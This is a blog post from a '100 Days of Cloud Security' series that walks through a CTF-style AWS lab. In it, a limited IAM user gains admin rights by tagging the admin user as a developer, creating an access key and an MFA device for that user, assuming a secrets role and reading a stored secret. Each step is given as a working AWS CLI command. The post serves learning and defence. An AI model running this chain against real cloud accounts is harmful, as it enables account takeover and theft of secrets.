---
title: '100 Days of Cloud Security - Day 30: Attack — `iam_privesc_by_key_rotation`'
date: '2025-12-09'
author: 'Venkata Pathuri'
excerpt: 'Day 30 of my cloud security journey - Attack — `iam_privesc_by_key_rotation`'
tags: ['cloud-security', 'aws', '100days', 'cybersecurity']
---

# Day 30: Attack — `iam_privesc_by_key_rotation`

## Overview

Welcome to Day 30 of our cloud security journey! Today, we explore a fascinating attack vector: privilege escalation via key rotation in AWS Identity and Access Management (IAM). Building on our foundational knowledge from Day 29, where we delved into IAM policies and their configurations, we will now conduct a hands-on attack simulation to leverage IAM permissions for unauthorized access. By the end of this session, you’ll understand a critical aspect of cloud security and how to defend against such attacks.

## Learning Objectives

In this session, you will master the following skills:

- Understanding the intricacies of IAM user and role configurations.
- Identifying privilege escalation vectors through IAM policy analysis.
- Executing a series of commands to simulate a real-world privilege escalation attack.
- Ultimately retrieving a secret from AWS Secrets Manager, demonstrating the impact of mismanaged IAM permissions.

This knowledge will empower you to better secure AWS environments against similar threats.

## Deep Dive

### Understanding the Scenario

In our scenario, we have three IAM users and one IAM role, alongside a secret stored in AWS Secrets Manager. Our goal is to escalate privileges from a user with limited permissions to one with administrative rights. 

Privilege escalation typically involves exploiting misconfigurations that allow users to gain unauthorized access to sensitive resources. In this case, we will use the manager IAM user with read-only access and specific inline policies to elevate our permissions.

### Step-by-Step Breakdown

1. **Verify Initial Access**  
   First, we need to confirm that we are authenticated as the `manager` user. This is done by using the AWS CLI to retrieve our account details:

   ```bash
   aws sts get-caller-identity --profile cg
   ```

   **Expected Output:**
   ```json
   {
       "UserId": "AIDA6QRD2LZQPKS4SZJQF",
       "Account": "997581282912",
       "Arn": "arn:aws:iam::997581282912:user/manager_cgid49rlglvmib"
   }
   ```

   This output confirms our identity and sets the stage for our privilege escalation.

2. **Enumerate IAM Users and Permissions**  
   Next, we will list all the IAM users in our account to identify potential targets:

   ```bash
   aws iam list-users --profile cg
   ```

   Upon reviewing the output, we notice the `admin` user, which is our target for escalation.

3. **Analyze Permissions**  
   By checking the attached and inline policies of the `manager` user, we identify critical permissions:

   ```bash
   aws iam list-attached-user-policies --user-name manager_cgid49rlglvmib --profile cg
   ```

   And for inline policies:

   ```bash
   aws iam list-user-policies --user-name manager_cgid49rlglvmib --profile cg
   ```

   Here, we discover that the `manager` user has the `SelfManageAccess` policy, allowing management of access keys and MFA devices for users tagged with `developer: true`.

4. **Privilege Escalation Vectors**  
   The key to our attack lies in the `TagResources` policy. This policy allows the `manager` user to tag any IAM user, including the `admin` user. By tagging `admin` as a developer, we can leverage the permissions granted by the `SelfManageAccess` policy.

5. **Execute the Escalation**  
   We will tag the `admin` user:

   ```bash
   aws iam tag-user --user-name admin_cgid49rlglvmib --tags Key=developer,Value=true --profile cg
   ```

   After confirming the tag is applied, we proceed to create a new access key for the `admin` user:

   ```bash
   aws iam create-access-key --user-name admin_cgid49rlglvmib --profile cg
   ```

6. **Configure MFA**  
   Since the `admin` user needs MFA to assume the secrets role, we create and enable an MFA device:

   ```bash
   aws iam create-virtual-mfa-device --virtual-mfa-device-name cg-admin --outfile qr.png --bootstrap-method QRCodePNG --profile cg
   ```

   After scanning the QR code, we enable the MFA:

   ```bash
   aws iam enable-mfa-device \
     --user-name admin_cgid49rlglvmib \
     --serial-number arn:aws:iam::997581282912:mfa/cg-admin \
     --authentication-code1 123456 \
     --authentication-code2 654321 \
     --profile cg-admin
   ```

7. **Assume the Secrets Manager Role**  
   Now, we can assume the secrets manager role and retrieve the secret:

   ```bash
   aws sts assume-role --role-arn arn:aws:iam::997581282912:role/cg_secretsmanager_cgid49rlglvmib --role-session-name secrets --serial-number arn:aws:iam::997581282912:mfa/cg-admin --token-code 123456 --profile cg-admin
   ```

8. **Retrieve the Flag**  
   Finally, we can access the secret:

   ```bash
   aws secretsmanager get-secret-value --secret-id cg_secret_cgid49rlglvmib --profile cg-secrets --region us-east-1
   ```

   This command reveals the secret that contains our flag.

## Hands-On Practice

To practice this exercise, follow these steps in your own AWS environment:

- Execute the provided AWS CLI commands while replacing any placeholder credentials with your own AWS IAM user details.
- Ensure you have the necessary permissions to perform these actions.
- Observe the outputs carefully to confirm each step's success.
- If you encounter errors, verify IAM policies and user permissions.

**Common Troubleshooting Tips:**
- Ensure that the AWS CLI is correctly configured with valid credentials.
- Check the AWS permissions for the user executing the commands if you receive access denied errors.
- Review the IAM policies to ensure they are correctly set up for the intended actions.

## Key Takeaways

Today, we explored the nuances of IAM policies and how misconfigurations can lead to privilege escalation in AWS. By understanding how to manipulate tags and leverage permissions, we demonstrated a practical attack scenario that underscores the importance of robust IAM configurations. Remember, knowledge of these attack vectors not only helps in understanding cloud security but also in fortifying your own AWS environments against similar threats.

## Real-World Applications

In production environments, organizations must regularly audit IAM policies and user permissions to prevent privilege escalation. Implementing the principle of least privilege, where users are granted only the permissions necessary to perform their job functions, is essential. Additionally, tagging practices should be carefully controlled to avoid unintended access. By applying these lessons learned today, you can help ensure stronger security postures in cloud infrastructures.

---
**Journey Progress:** 30/100 Days Complete 🚀